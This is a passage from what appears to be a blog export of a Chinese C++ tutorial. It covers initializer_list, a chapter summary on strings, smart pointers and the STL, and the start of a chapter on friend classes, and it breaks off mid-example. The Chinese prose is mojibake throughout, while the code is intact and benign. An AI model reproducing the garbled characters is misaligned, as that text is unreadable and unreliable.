<code>initializer_list</code> æœ€é‡è¦çš„ç”¨é€”ä¹‹ä¸€ï¼Œå®ƒä½¿å¾— STL å®¹å™¨ï¼ˆå¦‚ <code>vector</code>, <code>list</code>, <code>map</code>, <code>set</code> ç­‰ï¼‰ä»¥åŠç”¨æˆ·è‡ªå®šä¹‰çš„ç±»èƒ½å¤Ÿæ”¯æŒç®€æ´çš„èŠ±æ‹¬å·åˆ—è¡¨åˆå§‹åŒ–ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;initializer_list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¤ºä¾‹ï¼šä¸€ä¸ªç®€å•çš„è‡ªå®šä¹‰ç±»ï¼Œæ”¯æŒ initializer_list æ„é€ </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyData</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data_;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°æ¥å— initializer_list</span></span><br><span class="line">    MyData(<span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;<span class="keyword">int</span>&gt; il) : data_(il) &#123; <span class="comment">// å¯ä»¥ç›´æ¥ç”¨æ¥åˆå§‹åŒ– vector æˆå‘˜</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;MyData constructed with &quot;</span> &lt;&lt; il.size() &lt;&lt; <span class="string">&quot; elements.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x : data_) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ initializer_list æ„é€  STL å®¹å™¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;; <span class="comment">// è°ƒç”¨ vector(initializer_list&lt;int&gt;) æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">int</span>&gt; m = &#123;&#123;<span class="string">&quot;one&quot;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&quot;two&quot;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&quot;three&quot;</span>, <span class="number">3</span>&#125;&#125;; <span class="comment">// è°ƒç”¨ map(initializer_list&lt;pair&lt;const string, int&gt;&gt;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ initializer_list æ„é€ è‡ªå®šä¹‰ç±»</span></span><br><span class="line">    MyData md1 = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    MyData md2 &#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>&#125;; <span class="comment">// ä¹Ÿå¯ä»¥ç”¨èŠ±æ‹¬å·ç›´æ¥åˆå§‹åŒ–</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;md1 data: &quot;</span>;</span><br><span class="line">    md1.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;md2 data: &quot;</span>;</span><br><span class="line">    md2.print();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>initializer_list</code> æå¤§åœ°å¢å¼ºäº† C++11 åŠä»¥åç‰ˆæœ¬çš„åˆå§‹åŒ–è¯­æ³•ï¼Œä½¿å…¶æ›´åŠ ç»Ÿä¸€å’Œæ–¹ä¾¿ï¼Œç‰¹åˆ«æ˜¯å¯¹äºå®¹å™¨å’Œéœ€è¦æ¥å—å¯å˜æ•°é‡åŒç±»å‹å‚æ•°çš„åœºæ™¯ã€‚</p><h2 id="16-8-æ€»ç»“"><a href="#16-8-æ€»ç»“" class="headerlink" title="16.8 æ€»ç»“"></a>16.8 æ€»ç»“</h2><p>æœ¬ç« æ·±å…¥æ¢è®¨äº† C++ æ ‡å‡†åº“æä¾›çš„å‡ ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œå®ƒä»¬æå¤§åœ°å¢å¼ºäº† C++ çš„åŠŸèƒ½å’Œæ˜“ç”¨æ€§ï¼Œç‰¹åˆ«æ˜¯ <code>string</code> ç±»ã€æ™ºèƒ½æŒ‡é’ˆå’Œæ ‡å‡†æ¨¡æ¿åº“ (STL)ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p><strong><code>string</code> ç±»:</strong></p><ul><li>  æä¾›äº†æ¯” C é£æ ¼å­—ç¬¦æ•°ç»„æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„å­—ç¬¦ä¸²å¤„ç†æ–¹å¼ï¼Œå…·æœ‰è‡ªåŠ¨å†…å­˜ç®¡ç†å’Œä¸°å¯Œçš„æˆå‘˜å‡½æ•°ï¼ˆæ„é€ ã€è¾“å…¥ã€æ‹¼æ¥ã€æŸ¥æ‰¾ã€ä¿®æ”¹ã€æ¯”è¾ƒç­‰ï¼‰ã€‚</li><li>  æ”¯æŒé€šè¿‡ <code>c_str()</code> è·å–ä¸ C é£æ ¼å‡½æ•°å…¼å®¹çš„ <code>const char*</code>ã€‚</li><li>  æ ‡å‡†åº“è¿˜æä¾›äº†å®½å­—ç¬¦ç‰ˆæœ¬å¦‚ <code>wstring</code>ã€‚</li></ul></li><li><p><strong>æ™ºèƒ½æŒ‡é’ˆ (<code>&lt;memory&gt;</code>):</strong></p><ul><li>  ç”¨äºè‡ªåŠ¨ç®¡ç†åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼å’Œæ‚¬æŒ‚æŒ‡é’ˆã€‚</li><li>  <strong><code>unique_ptr</code>:</strong> å®ç°ç‹¬å æ‰€æœ‰æƒï¼Œè½»é‡çº§ï¼Œä¸å¯å¤åˆ¶ï¼Œå¯ç§»åŠ¨ã€‚ç®¡ç†åŠ¨æ€æ•°ç»„æ—¶ä½¿ç”¨ <code>unique_ptr&lt;T[]&gt;</code>ã€‚æ˜¯ç®¡ç†åŠ¨æ€èµ„æºçš„é¦–é€‰ã€‚</li><li>  <strong><code>shared_ptr</code>:</strong> å®ç°å…±äº«æ‰€æœ‰æƒï¼Œé€šè¿‡å¼•ç”¨è®¡æ•°ç®¡ç†èµ„æºç”Ÿå‘½å‘¨æœŸã€‚å½“æœ€åä¸€ä¸ª <code>shared_ptr</code> é”€æ¯æ—¶é‡Šæ”¾èµ„æºã€‚éœ€è¦æ³¨æ„å¾ªç¯å¼•ç”¨é—®é¢˜ã€‚</li><li>  <strong><code>weak_ptr</code>:</strong> éæ‹¥æœ‰å‹æŒ‡é’ˆï¼Œç”¨äºè§‚å¯Ÿ <code>shared_ptr</code> ç®¡ç†çš„å¯¹è±¡ï¼Œä¸å¢åŠ å¼•ç”¨è®¡æ•°ï¼Œå¯ç”¨äºæ‰“ç ´å¾ªç¯å¼•ç”¨ã€‚é€šè¿‡ <code>lock()</code> å®‰å…¨åœ°è·å– <code>shared_ptr</code>ã€‚</li><li>  åº”ä¼˜å…ˆä½¿ç”¨ <code>make_unique</code> å’Œ <code>make_shared</code> åˆ›å»ºæ™ºèƒ½æŒ‡é’ˆã€‚</li><li>  <code>auto_ptr</code> å·²è¢«åºŸå¼ƒï¼Œåº”ä½¿ç”¨ <code>unique_ptr</code>ã€‚</li></ul></li><li><p><strong>æ ‡å‡†æ¨¡æ¿åº“ (STL):</strong></p><ul><li>  åŸºäºæ³›å‹ç¼–ç¨‹æ€æƒ³ï¼Œæä¾›é€šç”¨çš„å®¹å™¨ã€ç®—æ³•å’Œè¿­ä»£å™¨ã€‚</li><li><strong>å®¹å™¨:</strong> å­˜å‚¨æ•°æ®çš„æ¨¡æ¿ç±»ã€‚<ul><li>  <strong>é¡ºåºå®¹å™¨:</strong> <code>vector</code> (åŠ¨æ€æ•°ç»„), <code>deque</code> (åŒç«¯é˜Ÿåˆ—), <code>list</code> (åŒå‘é“¾è¡¨), <code>forward_list</code> (å•å‘é“¾è¡¨), <code>array</code> (å›ºå®šå¤§å°æ•°ç»„)ã€‚</li><li>  <strong>å…³è”å®¹å™¨:</strong> <code>set</code>, <code>map</code>, <code>multiset</code>, <code>multimap</code> (åŸºäºé”®æ’åºï¼Œå¯¹æ•°æ—¶é—´å¤æ‚åº¦)ã€‚</li><li>  <strong>æ— åºå…³è”å®¹å™¨:</strong> <code>unordered_set</code>, <code>unordered_map</code>, <code>unordered_multiset</code>, <code>unordered_multimap</code> (åŸºäºå“ˆå¸Œï¼Œå¹³å‡å¸¸æ•°æ—¶é—´å¤æ‚åº¦)ã€‚</li><li>  <strong>å®¹å™¨é€‚é…å™¨:</strong> <code>stack</code>, <code>queue</code>, <code>priority_queue</code> (æä¾›ç‰¹å®šæ¥å£)ã€‚</li></ul></li><li>  <strong><code>vector</code>:</strong> æœ€å¸¸ç”¨çš„åŠ¨æ€æ•°ç»„ï¼Œæ”¯æŒéšæœºè®¿é—®ï¼Œå°¾éƒ¨æ“ä½œé«˜æ•ˆã€‚</li><li>  <strong>è¿­ä»£å™¨:</strong> æ³›åŒ–çš„æŒ‡é’ˆï¼Œè¿æ¥å®¹å™¨å’Œç®—æ³•ï¼Œæä¾›ç»Ÿä¸€çš„éå†æ¥å£ã€‚åˆ†ä¸ºè¾“å…¥ã€è¾“å‡ºã€å‰å‘ã€åŒå‘ã€éšæœºè®¿é—®äº”ç§ç±»åˆ«ã€‚</li><li>  <strong>ç®—æ³• (<code>&lt;algorithm&gt;</code>, <code>&lt;numeric&gt;</code>):</strong> å¯¹è¿­ä»£å™¨æŒ‡å®šçš„èŒƒå›´è¿›è¡Œæ“ä½œçš„å‡½æ•°æ¨¡æ¿ï¼ˆå¦‚ <code>sort</code>, <code>find</code>, <code>copy</code>, <code>transform</code>, <code>accumulate</code>ï¼‰ã€‚ç®—æ³•é€šå¸¸ä¸æ”¹å˜å®¹å™¨å¤§å°ï¼Œéœ€è¦é…åˆå®¹å™¨æ–¹æ³•ï¼ˆå¦‚ <code>erase</code>ï¼‰æ¥å®é™…å¢åˆ å…ƒç´ ã€‚</li><li>  <strong>åŸºäºèŒƒå›´çš„ for å¾ªç¯ (C++11):</strong> æä¾›äº†ç®€æ´ã€å®‰å…¨çš„éå†å®¹å™¨ï¼ˆæˆ–åºåˆ—ï¼‰çš„æ–¹å¼ã€‚</li></ul></li><li><p><strong>å‡½æ•°å¯¹è±¡ (Functors):</strong></p><ul><li>  é‡è½½äº† <code>operator()</code> çš„ç±»çš„å¯¹è±¡ï¼Œå¯ä»¥åƒå‡½æ•°ä¸€æ ·è°ƒç”¨ã€‚</li><li>  å¯ä»¥æºå¸¦çŠ¶æ€ï¼Œå¸¸ä½œä¸ºå‚æ•°ä¼ é€’ç»™ STL ç®—æ³•ä»¥å®šåˆ¶è¡Œä¸ºã€‚</li><li>  æ ‡å‡†åº“åœ¨ <code>&lt;functional&gt;</code> ä¸­æä¾›äº†é¢„å®šä¹‰çš„å‡½æ•°ç¬¦ï¼ˆå¦‚ <code>plus</code>, <code>less</code>ï¼‰ã€‚</li><li>  ç°ä»£ C++ ä¸­ï¼ŒLambda è¡¨è¾¾å¼å’Œ <code>std::bind</code> æä¾›äº†æ¯”æ—§å¼å‡½æ•°é€‚é…å™¨æ›´çµæ´»çš„æ–¹å¼ã€‚</li></ul></li><li><p><strong>å…¶ä»–åº“ç‰¹æ€§:</strong></p><ul><li>  <strong><code>valarray</code> (<code>&lt;valarray&gt;</code>):</strong> ä¸“ä¸ºæ•°å€¼è®¡ç®—è®¾è®¡çš„åŠ¨æ€æ•°ç»„ï¼Œæ”¯æŒå…ƒç´ çº§ç®—æœ¯è¿ç®—ã€‚</li><li>  <strong><code>initializer_list</code> (<code>&lt;initializer_list&gt;</code>, C++11):</strong> ä½¿å¾—å‡½æ•°å’Œæ„é€ å‡½æ•°èƒ½æ¥å—èŠ±æ‹¬å·åˆå§‹åŒ–åˆ—è¡¨ <code>&#123;...&#125;</code>ï¼Œç®€åŒ–äº†å®¹å™¨å’Œè‡ªå®šä¹‰ç±»çš„åˆå§‹åŒ–ã€‚</li></ul></li></ol><p>æœ¬ç« ä»‹ç»çš„åº“ç‰¹æ€§æ˜¯ç°ä»£ C++ ç¼–ç¨‹çš„åŸºç¡€ã€‚ç†Ÿç»ƒè¿ç”¨ <code>string</code>ã€æ™ºèƒ½æŒ‡é’ˆå’Œ STL çš„å®¹å™¨ã€è¿­ä»£å™¨ã€ç®—æ³•ï¼Œå¯ä»¥ç¼–å†™å‡ºæ›´å®‰å…¨ã€æ›´ç®€æ´ã€æ›´é«˜æ•ˆã€æ›´æ˜“äºç»´æŠ¤çš„ä»£ç ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 15 å‹å…ƒã€å¼‚å¸¸å’Œå…¶ä»–</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_15/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_15/</url>
      
        <content type="html"><![CDATA[<h2 id="15-1-å‹å…ƒ"><a href="#15-1-å‹å…ƒ" class="headerlink" title="15.1 å‹å…ƒ"></a>15.1 å‹å…ƒ</h2><p>é€šå¸¸ï¼Œç±»çš„ <code>private</code> å’Œ <code>protected</code> æˆå‘˜åªèƒ½è¢«è¯¥ç±»çš„æˆå‘˜å‡½æ•°è®¿é—®ã€‚è¿™æ˜¯ C++ å°è£…æ€§çš„ä½“ç°ï¼Œæœ‰åŠ©äºä¿æŠ¤æ•°æ®å’Œéšè—å®ç°ç»†èŠ‚ã€‚ç„¶è€Œï¼Œåœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå…è®¸ç‰¹å®šçš„å¤–éƒ¨å‡½æ•°æˆ–ç±»è®¿é—®ä¸€ä¸ªç±»çš„ç§æœ‰æˆ–ä¿æŠ¤æˆå‘˜ä¼šéå¸¸æ–¹ä¾¿ã€‚C++ æä¾›äº†<strong>å‹å…ƒ (friend)</strong> æœºåˆ¶æ¥å®ç°è¿™ç§å—æ§çš„è®¿é—®ã€‚</p><p><strong>å‹å…ƒ</strong>å¯ä»¥æ˜¯ï¼š</p><ul><li>  <strong>å‹å…ƒå‡½æ•° (Friend Function):</strong> ä¸€ä¸ªéæˆå‘˜å‡½æ•°è¢«å£°æ˜ä¸ºæŸä¸ªç±»çš„å‹å…ƒã€‚</li><li>  <strong>å‹å…ƒç±» (Friend Class):</strong> ä¸€ä¸ªç±»è¢«å£°æ˜ä¸ºå¦ä¸€ä¸ªç±»çš„å‹å…ƒã€‚</li><li>  <strong>å‹å…ƒæˆå‘˜å‡½æ•° (Friend Member Function):</strong> æŸä¸ªç±»çš„æˆå‘˜å‡½æ•°è¢«å£°æ˜ä¸ºå¦ä¸€ä¸ªç±»çš„å‹å…ƒã€‚</li></ul><p><strong>å£°æ˜å‹å…ƒ:</strong></p><p>åœ¨éœ€è¦æˆäºˆè®¿é—®æƒé™çš„ç±»ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º<strong>å®¿ä¸»ç±»</strong>ï¼‰çš„å®šä¹‰å†…éƒ¨ï¼Œä½¿ç”¨ <code>friend</code> å…³é”®å­—æ¥å£°æ˜å‹å…ƒã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HostClass</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> ReturnType <span class="title">friendFunctionName</span><span class="params">(parameters)</span></span>; <span class="comment">// å£°æ˜å‹å…ƒå‡½æ•°</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">FriendClassName</span>;</span>                    <span class="comment">// å£°æ˜å‹å…ƒç±»</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> ReturnType <span class="title">AnotherClass::memberFuncName</span><span class="params">(parameters)</span></span>; <span class="comment">// å£°æ˜å‹å…ƒæˆå‘˜å‡½æ•°</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> privateData;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> protectedData;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>é‡è¦ç‰¹æ€§:</strong></p><ul><li>  <strong>è®¿é—®æƒé™:</strong> å‹å…ƒå‡½æ•°æˆ–å‹å…ƒç±»ï¼ˆåŠå…¶æ‰€æœ‰æˆå‘˜å‡½æ•°ï¼‰å¯ä»¥è®¿é—®å®¿ä¸»ç±»çš„<strong>æ‰€æœ‰</strong>æˆå‘˜ï¼ŒåŒ…æ‹¬ <code>private</code> å’Œ <code>protected</code> æˆå‘˜ã€‚</li><li>  <strong>éä¼ é€’æ€§:</strong> å‹å…ƒå…³ç³»ä¸æ˜¯ä¼ é€’çš„ã€‚å¦‚æœç±» A æ˜¯ç±» B çš„å‹å…ƒï¼Œç±» B æ˜¯ç±» C çš„å‹å…ƒï¼Œè¿™å¹¶ä¸æ„å‘³ç€ç±» A æ˜¯ç±» C çš„å‹å…ƒã€‚</li><li>  <strong>éå¯¹ç§°æ€§:</strong> å‹å…ƒå…³ç³»ä¸æ˜¯å¯¹ç§°çš„ã€‚å¦‚æœç±» A æ˜¯ç±» B çš„å‹å…ƒï¼Œè¿™å¹¶ä¸æ„å‘³ç€ç±» B æ˜¯ç±» A çš„å‹å…ƒã€‚</li><li>  <strong>å£°æ˜ä½ç½®:</strong> <code>friend</code> å£°æ˜å¯ä»¥æ”¾åœ¨ç±»å®šä¹‰çš„ <code>public</code>, <code>protected</code>, æˆ– <code>private</code> éƒ¨åˆ†ï¼Œæ•ˆæœæ˜¯ç›¸åŒçš„ã€‚é€šå¸¸ä¹ æƒ¯æ”¾åœ¨ç±»å®šä¹‰çš„å¼€å§‹æˆ–ç»“æŸå¤„ã€‚</li></ul><h3 id="15-1-1-å‹å…ƒç±»"><a href="#15-1-1-å‹å…ƒç±»" class="headerlink" title="15.1.1 å‹å…ƒç±»"></a>15.1.1 å‹å…ƒç±»</h3><p>å½“ä¸€ä¸ªç±»è¢«å£°æ˜ä¸ºå¦ä¸€ä¸ªç±»çš„å‹å…ƒæ—¶ï¼Œè¿™ä¸ªå‹å…ƒç±»çš„<strong>æ‰€æœ‰æˆå‘˜å‡½æ•°</strong>éƒ½å¯ä»¥è®¿é—®å®¿ä¸»ç±»çš„ç§æœ‰å’Œä¿æŠ¤æˆå‘˜ã€‚</p><p><strong>ç¤ºä¾‹:</strong> å‡è®¾æœ‰ä¸€ä¸ª <code>Tv</code> ç±»ï¼ˆç”µè§†ï¼‰å’Œä¸€ä¸ª <code>Remote</code> ç±»ï¼ˆé¥æ§å™¨ï¼‰ã€‚é¥æ§å™¨éœ€è¦èƒ½å¤Ÿç›´æ¥è°ƒæ•´ç”µè§†çš„çŠ¶æ€ï¼ˆå¦‚é¢‘é“ã€éŸ³é‡ï¼‰ï¼Œå³ä½¿è¿™äº›çŠ¶æ€æ˜¯ç§æœ‰çš„ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tv.h -- Tv and Remote classes</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TV_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TV_H_</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tv</span>;</span> <span class="comment">// å‰å‘å£°æ˜ Tv ç±»ï¼Œå› ä¸º Remote ä¼šç”¨åˆ°å®ƒ</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Remote</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">State</span> &#123;</span> Off, On &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> MinVal, MaxVal = <span class="number">20</span> &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> Antenna, Cable &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> TV, DVD &#125;; <span class="comment">// å‡è®¾é¥æ§å™¨ä¹Ÿå¯ä»¥æ§åˆ¶ DVD</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> mode; <span class="comment">// æ§åˆ¶ TV è¿˜æ˜¯ DVD</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Remote(<span class="keyword">int</span> m = TV) : mode(m) &#123;&#125;</span><br><span class="line">    <span class="comment">// é¥æ§å™¨çš„æ–¹æ³•ï¼Œéœ€è¦è®¿é—® Tv çš„ç§æœ‰æˆå‘˜</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">volup</span><span class="params">(Tv &amp; t)</span></span>; <span class="comment">// å¼•ç”¨ Tv å¯¹è±¡</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">voldown</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onoff</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">chanup</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">chandown</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_mode</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_input</span><span class="params">(Tv &amp; t)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_chan</span><span class="params">(Tv &amp; t, <span class="keyword">int</span> c)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tv</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> state;      <span class="comment">// On or Off</span></span><br><span class="line">    <span class="keyword">int</span> volume;     <span class="comment">// assumed to be digitized</span></span><br><span class="line">    <span class="keyword">int</span> maxchannel; <span class="comment">// maximum number of channels</span></span><br><span class="line">    <span class="keyword">int</span> channel;    <span class="comment">// current channel setting</span></span><br><span class="line">    <span class="keyword">int</span> mode;       <span class="comment">// Antenna or Cable</span></span><br><span class="line">    <span class="keyword">int</span> input;      <span class="comment">// TV or DVD</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// å°† Remote ç±»å£°æ˜ä¸º Tv ç±»çš„å‹å…ƒ</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Remote</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">State</span> &#123;</span> Off, On &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> MinVal, MaxVal = <span class="number">20</span> &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> Antenna, Cable &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> TV, DVD &#125;;</span><br><span class="line"></span><br><span class="line">    Tv(<span class="keyword">int</span> s = Off, <span class="keyword">int</span> mc = <span class="number">125</span>) : state(s), volume(<span class="number">5</span>),</span><br><span class="line">        maxchannel(mc), channel(<span class="number">2</span>), mode(Cable), input(TV) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onoff</span><span class="params">()</span> 